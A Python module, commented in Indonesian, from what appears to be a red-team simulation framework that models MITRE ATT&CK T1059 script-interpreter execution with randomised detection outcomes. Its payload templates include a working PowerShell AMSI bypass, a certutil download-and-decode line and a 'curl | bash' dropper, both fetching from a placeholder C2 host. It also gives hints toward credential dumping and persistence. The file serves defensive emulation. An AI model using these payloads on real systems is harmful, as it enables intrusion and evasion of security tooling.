"""
T1059 — Command and Scripting Interpreter (Execution)

Simulasi eksekusi perintah melalui interpreter scripting yang legitimate.
Ini adalah salah satu teknik eksekusi yang paling umum digunakan APT.

Sub-teknik yang disimulasikan:
- T1059.001 — PowerShell
- T1059.003 — Windows Command Shell (cmd.exe)
- T1059.004 — Unix Shell (bash, sh)
- T1059.005 — Visual Basic Script
"""

from core.techniques.base import (
    BaseTechnique,
    Environment,
    ExecutionStatus,
    TechniqueContext,
    TechniqueResult,
)
from core.techniques.registry import register_technique


@register_technique
class CommandScriptingTechnique(BaseTechnique):
    """
    Simulasi eksekusi payload melalui command and scripting interpreter.

    Teknik ini sangat fleksibel — bisa untuk eksekusi payload,
    persistence, privilege escalation, maupun lateral movement.

    Fitur simulasi:
    - PowerShell in-memory execution (fileless)
    - AMSI bypass simulation
    - Command obfuscation simulation
    - Living-off-the-land (LOLBins) usage
    """

    technique_id = "T1059"
    name = "Command and Scripting Interpreter"
    description = (
        "Adversari menggunakan command interpreter yang sudah ada di sistem "
        "(PowerShell, cmd, bash) untuk mengeksekusi perintah dan script."
    )
    supported_environments = [Environment.IT]
    risk_level = "high"
    is_destructive = False
    requires_elevated_privileges = False
    tactic = "execution"

    # Interpreter yang didukung dan karakteristiknya
    INTERPRETERS = {
        "powershell": {
            "detection_risk":  0.45,
            "edr_alert_prone": True,
            "amsi_bypass_needed": True,
            "description": "PowerShell in-memory execution dengan encoded command",
        },
        "cmd":  {
            "detection_risk":  0.25,
            "edr_alert_prone": False,
            "amsi_bypass_needed": False,
            "description": "cmd.exe untuk eksekusi batch command dan LOLBins",
        },
        "bash": {
            "detection_risk":  0.20,
            "edr_alert_prone": False,
            "amsi_bypass_needed": False,
            "description": "Bash scripting untuk target Linux/Unix",
        },
        "wscript": {
            "detection_risk":  0.30,
            "edr_alert_prone": True,
            "amsi_bypass_needed": True,
            "description": "WScript/CScript untuk eksekusi VBScript atau JScript",
        },
    }

    # Payload template yang digunakan dalam simulasi
    PAYLOAD_TEMPLATES = {
        "powershell_cradle": (
            "powershell.exe -NonI -W Hidden -Enc "
            "[Base64EncodedCommand] "
            "# Download dan eksekusi payload dari remote URL (in-memory)"
        ),
        "powershell_amsi_bypass": (
            "powershell.exe -ep bypass -c "
            "\"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
            ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\""
            " ; [Payload]"
        ),
        "cmd_lolbin": (
            "certutil.exe -urlcache -f http://[C2]/payload.b64 %TEMP%\\update.b64 "
            "& certutil.exe -decode %TEMP%\\update.b64 %TEMP%\\payload.exe"
        ),
        "bash_dropper": (
            "curl -s http://[C2]/agent.sh | bash"
            " # Download dan eksekusi agent via bash pipe"
        ),
    }

    async def execute(self, context: TechniqueContext, result: TechniqueResult) -> None:
        interpreter = context.extra.get("interpreter", "powershell")
        payload_type = context.extra.get("payload_type", "cradle")
        use_obfuscation = context.extra.get("obfuscation", True)
        amsi_bypass = context.extra.get("amsi_bypass", interpreter == "powershell")

        interp_info = self.INTERPRETERS.get(interpreter, self.INTERPRETERS["powershell"])
        detection_risk = interp_info["detection_risk"]

        # Obfuskasi mengurangi detection risk sebesar 40%
        if use_obfuscation:
            detection_risk *= 0.60

        # AMSI bypass mengurangi detection risk PowerShell sebesar 30%
        if amsi_bypass and interpreter == "powershell":
            detection_risk *= 0.70

        output_lines = [
            f"[T1059 — COMMAND & SCRIPTING INTERPRETER]",
            f"Interpreter : {interpreter}",
            f"Target      : {context.target_host}",
            f"Obfuscation : {'AKTIF' if use_obfuscation else 'NONAKTIF'}",
            f"AMSI Bypass : {'AKTIF' if amsi_bypass else 'N/A'}",
            f"{'─' * 55}",
        ]

        detected = self._simulate_detection(detection_risk)

        if amsi_bypass and interpreter == "powershell":
            output_lines.append(
                "[+] AMSI bypass berhasil — script execution tidak di-scan oleh Windows Defender"
            )

        if use_obfuscation:
            output_lines.append(
                "[+] Payload diobfuskasi menggunakan string fragmentation + Base64 chaining"
            )

        # Template payload yang digunakan
        template_key = f"{interpreter}_{'amsi_bypass' if amsi_bypass else 'cradle'}"
        payload_display = self.PAYLOAD_TEMPLATES.get(
            template_key,
            self.PAYLOAD_TEMPLATES.get(f"{interpreter}_lolbin", "[generic payload]")
        )
        output_lines.append(f"\n[PAYLOAD USED]\n{payload_display}")

        if detected:
            result.status = ExecutionStatus.PARTIAL
            output_lines.append(
                f"\n[DETECTION] EDR mendeteksi suspicious {interpreter} activity. "
                f"Alert: 'Suspicious {interpreter.capitalize()} Encoded Command Execution'. "
                f"Process killed setelah {self._random_seconds(5, 30)} detik."
            )
            result.next_step_hints = [
                "Coba interpreter alternatif: wscript, mshta, atau InstallUtil",
                "Aktifkan obfuscasi yang lebih agresif (junk code, string splitting)",
                f"Pertimbangkan T1027 (Obfuscated Files) sebelum re-eksekusi",
            ]
        else:
            result.status = ExecutionStatus.SUCCESS
            exec_time = self._random_seconds(2, 8)
            output_lines.append(
                f"\n[SUCCESS] Payload berhasil dieksekusi dalam {exec_time} detik. "
                f"Process PID: {self._random_pid()} — tidak ada alert EDR."
            )
            result.collected_data["shell_access"] = True
            result.collected_data["interpreter"] = interpreter
            result.collected_data["pid"] = self._random_pid()
            result.artifacts_created = [
                f"%TEMP%\\{self._random_filename()}" if context.target_os != "Linux"
                else f"/tmp/{self._random_filename()}",
            ]
            result.next_step_hints = [
                "T1082 (System Information Discovery) untuk reconnaissance",
                "T1003 (Credential Dumping) jika sudah punya akses SYSTEM",
                "T1547 (Boot/Logon Autostart) untuk persistence",
            ]

        result.output = "\n".join(output_lines)

    def _simulate_detection(self, probability: float) -> bool:
        import random
        return random.random() < probability

    def _random_seconds(self, min_s: int, max_s: int) -> int:
        import random
        return random.randint(min_s, max_s)

    def _random_pid(self) -> int:
        import random
        return random.randint(1000, 65535)

    def _random_filename(self) -> str:
        import random, string
        return "".join(random.choices(string.ascii_lowercase, k=8)) + ".tmp"
